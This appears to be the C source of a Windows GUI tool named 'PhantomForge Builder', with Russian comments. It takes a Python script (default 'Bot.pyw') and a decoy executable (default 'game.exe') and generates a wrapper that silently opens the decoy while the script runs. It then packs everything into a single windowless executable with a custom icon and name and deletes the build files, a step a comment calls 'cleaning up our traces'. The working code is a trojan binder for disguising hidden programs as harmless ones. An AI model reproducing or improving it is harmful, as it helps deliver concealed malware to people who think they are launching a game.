#include <windows.h>
#include <commctrl.h>
#include <stdio.h>
#include <stdlib.h>

#define ID_BTN_BUILD 1
#define ID_EDIT_NAME 2
#define ID_EDIT_ICON 3
#define ID_EDIT_SCRIPT 4
#define ID_EDIT_EXEC 5

HWND hMainWindow, hLogWindow;
HWND hEditLog, hProgressBar;
wchar_t buildCommand[2048];

void AppendLogText(HWND hEdit, const wchar_t* newText) {
    int length = GetWindowTextLengthW(hEdit);
    SendMessageW(hEdit, EM_SETSEL, (WPARAM)length, (LPARAM)length);
    SendMessageW(hEdit, EM_REPLACESEL, FALSE, (LPARAM)newText);
    SendMessageW(hEdit, WM_VSCROLL, SB_BOTTOM, 0);
}

DWORD WINAPI BuildThread(LPVOID lpParam) {
    HANDLE hPipeRead, hPipeWrite;
    SECURITY_ATTRIBUTES saAttr = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

    if (!CreatePipe(&hPipeRead, &hPipeWrite, &saAttr, 0)) {
        AppendLogText(hEditLog, L"Ошибка: Не удалось создать канал вывода.\r\n");
        return 1;
    }
    SetHandleInformation(hPipeRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    PROCESS_INFORMATION pi;
    
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hPipeWrite;
    si.hStdError  = hPipeWrite;

    AppendLogText(hEditLog, L"[*] PhantomForge: Подготовка файлов и запуск PyInstaller...\r\n");

    if (!CreateProcessW(NULL, buildCommand, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        AppendLogText(hEditLog, L"Ошибка: Не удалось запустить PyInstaller.\r\n");
        CloseHandle(hPipeRead);
        CloseHandle(hPipeWrite);
        return 1;
    }

    CloseHandle(hPipeWrite);
    SendMessageW(hProgressBar, PBM_SETMARQUEE, TRUE, 0);

    DWORD dwRead;
    char buffer[512];
    wchar_t wBuffer[512];

    while (ReadFile(hPipeRead, buffer, sizeof(buffer) - 1, &dwRead, NULL) && dwRead != 0) {
        buffer[dwRead] = '\0';
        MultiByteToWideChar(CP_OEMCP, 0, buffer, -1, wBuffer, 512);
        AppendLogText(hEditLog, wBuffer);
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    SendMessageW(hProgressBar, PBM_SETMARQUEE, FALSE, 0);
    
    // Убираем за собой следы
    DeleteFileW(L"_temp_build.pyw");
    DeleteFileW(L"_temp_build.spec");
    
    AppendLogText(hEditLog, L"\r\n[+] Сборка успешно завершена! Проверьте папку dist.\r\n");

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hPipeRead);

    return 0;
}

LRESULT CALLBACK LogWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_CREATE:
            hProgressBar = CreateWindowExW(0, PROGRESS_CLASSW, NULL,
                WS_CHILD | WS_VISIBLE | PBS_MARQUEE,
                20, 20, 540, 20, hwnd, NULL, NULL, NULL);

            hEditLog = CreateWindowExW(WS_EX_CLIENTEDGE, L"Edit", L"",
                WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE | ES_AUTOVSCROLL | ES_READONLY,
                20, 50, 540, 280, hwnd, NULL, NULL, NULL);

            SendMessageW(hEditLog, WM_SETFONT, (WPARAM)GetStockObject(DEFAULT_GUI_FONT), TRUE);
            CreateThread(NULL, 0, BuildThread, NULL, 0, NULL);
            break;
        case WM_DESTROY:
            PostQuitMessage(0);
            break;
        default:
            return DefWindowProcW(hwnd, msg, wParam, lParam);
    }
    return 0;
}

LRESULT CALLBACK MainWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_CREATE:
            CreateWindowW(L"Static", L"Название EXE (без .exe):", WS_VISIBLE | WS_CHILD, 20, 15, 300, 20, hwnd, NULL, NULL, NULL);
            CreateWindowW(L"Edit", L"MyProgram", WS_VISIBLE | WS_CHILD | WS_BORDER | ES_AUTOHSCROLL, 20, 35, 300, 25, hwnd, (HMENU)ID_EDIT_NAME, NULL, NULL);

            CreateWindowW(L"Static", L"Путь к иконке (.ico):", WS_VISIBLE | WS_CHILD, 20, 70, 300, 20, hwnd, NULL, NULL, NULL);
            CreateWindowW(L"Edit", L"icon.ico", WS_VISIBLE | WS_CHILD | WS_BORDER | ES_AUTOHSCROLL, 20, 90, 300, 25, hwnd, (HMENU)ID_EDIT_ICON, NULL, NULL);

            CreateWindowW(L"Static", L"Путь к Python скрипту (.py / .pyw):", WS_VISIBLE | WS_CHILD, 20, 125, 300, 20, hwnd, NULL, NULL, NULL);
            CreateWindowW(L"Edit", L"Bot.pyw", WS_VISIBLE | WS_CHILD | WS_BORDER | ES_AUTOHSCROLL, 20, 145, 300, 25, hwnd, (HMENU)ID_EDIT_SCRIPT, NULL, NULL);

            // Поле для пути исполнения (теперь можно писать просто имя файла!)
            CreateWindowW(L"Static", L"Путь к файлу исполнения (или просто Имя файла):", WS_VISIBLE | WS_CHILD, 20, 180, 330, 20, hwnd, NULL, NULL, NULL);
            CreateWindowW(L"Edit", L"game.exe", WS_VISIBLE | WS_CHILD | WS_BORDER | ES_AUTOHSCROLL, 20, 200, 300, 25, hwnd, (HMENU)ID_EDIT_EXEC, NULL, NULL);

            CreateWindowW(L"Button", L"Запустить сборку", WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON, 100, 245, 140, 30, hwnd, (HMENU)ID_BTN_BUILD, NULL, NULL);
            break;

        case WM_COMMAND:
            if (LOWORD(wParam) == ID_BTN_BUILD) {
                wchar_t name[MAX_PATH], icon[MAX_PATH], script[MAX_PATH], execPath[MAX_PATH];

                GetWindowTextW(GetDlgItem(hwnd, ID_EDIT_NAME), name, MAX_PATH);
                GetWindowTextW(GetDlgItem(hwnd, ID_EDIT_ICON), icon, MAX_PATH);
                GetWindowTextW(GetDlgItem(hwnd, ID_EDIT_SCRIPT), script, MAX_PATH);
                GetWindowTextW(GetDlgItem(hwnd, ID_EDIT_EXEC), execPath, MAX_PATH);

                FILE *fOut = _wfopen(L"_temp_build.pyw", L"wb");
                if (fOut) {
                    char utf8ExecPath[1024] = {0};
                    WideCharToMultiByte(CP_UTF8, 0, execPath, -1, utf8ExecPath, 1024, NULL, NULL);

                    if (strlen(utf8ExecPath) > 0) {
                        // Внедряем умный код, который сам находит реальную папку запуска
                        fprintf(fOut, "import os, sys, threading\n");
                        fprintf(fOut, "def _launch_target():\n");
                        fprintf(fOut, "    try:\n");
                        fprintf(fOut, "        if getattr(sys, 'frozen', False):\n");
                        fprintf(fOut, "            base_dir = os.path.dirname(sys.executable)\n");
                        fprintf(fOut, "        else:\n");
                        fprintf(fOut, "            base_dir = os.path.dirname(__file__)\n");
                        fprintf(fOut, "        target = r\"%s\"\n", utf8ExecPath);
                        fprintf(fOut, "        if not os.path.isabs(target):\n");
                        fprintf(fOut, "            target = os.path.join(base_dir, target)\n");
                        fprintf(fOut, "        os.startfile(target)\n");
                        fprintf(fOut, "    except: pass\n");
                        fprintf(fOut, "threading.Thread(target=_launch_target, daemon=True).start()\n\n");
                    }

                    FILE *fIn = _wfopen(script, L"rb");
                    if (fIn) {
                        char buf[4096];
                        size_t bytes;
                        while ((bytes = fread(buf, 1, sizeof(buf), fIn)) > 0) {
                            fwrite(buf, 1, bytes, fOut);
                        }
                        fclose(fIn);
                    } else {
                        MessageBoxW(hwnd, L"Ошибка: не удалось прочитать Python скрипт!", L"Ошибка", MB_OK | MB_ICONERROR);
                        fclose(fOut);
                        break;
                    }
                    fclose(fOut);
                }

                swprintf(buildCommand, 2048, L"python.exe -m PyInstaller --onefile --noconsole --icon=\"%ls\" --name=\"%ls\" \"_temp_build.pyw\"", icon, name);

                ShowWindow(hwnd, SW_HIDE);
                hLogWindow = CreateWindowW(L"LogWindowApp", L"Процесс сборки...", WS_OVERLAPPEDWINDOW | WS_VISIBLE,
                                           100, 100, 600, 400, NULL, NULL, GetModuleHandle(NULL), NULL);
            }
            break;

        case WM_DESTROY:
            PostQuitMessage(0);
            break;

        default:
            return DefWindowProcW(hwnd, msg, wParam, lParam);
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    INITCOMMONCONTROLSEX icex;
    icex.dwSize = sizeof(INITCOMMONCONTROLSEX);
    icex.dwICC = ICC_PROGRESS_CLASS;
    InitCommonControlsEx(&icex);

    WNDCLASSW wcMain = {0}, wcLog = {0};

    wcMain.lpszClassName = L"MainBuilderApp";
    wcMain.hInstance = hInstance;
    wcMain.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);
    wcMain.lpfnWndProc = MainWndProc;
    wcMain.hCursor = LoadCursor(NULL, IDC_ARROW);
    RegisterClassW(&wcMain);

    wcLog.lpszClassName = L"LogWindowApp";
    wcLog.hInstance = hInstance;
    wcLog.hbrBackground = (HBRUSH)(COLOR_WINDOW);
    wcLog.lpfnWndProc = LogWndProc;
    wcLog.hCursor = LoadCursor(NULL, IDC_ARROW);
    RegisterClassW(&wcLog);

    hMainWindow = CreateWindowW(L"MainBuilderApp", L"PhantomForge Builder", WS_OVERLAPPEDWINDOW | WS_VISIBLE, 
                                100, 100, 380, 330, NULL, NULL, hInstance, NULL);

    MSG msg;
    while(GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return msg.wParam;
}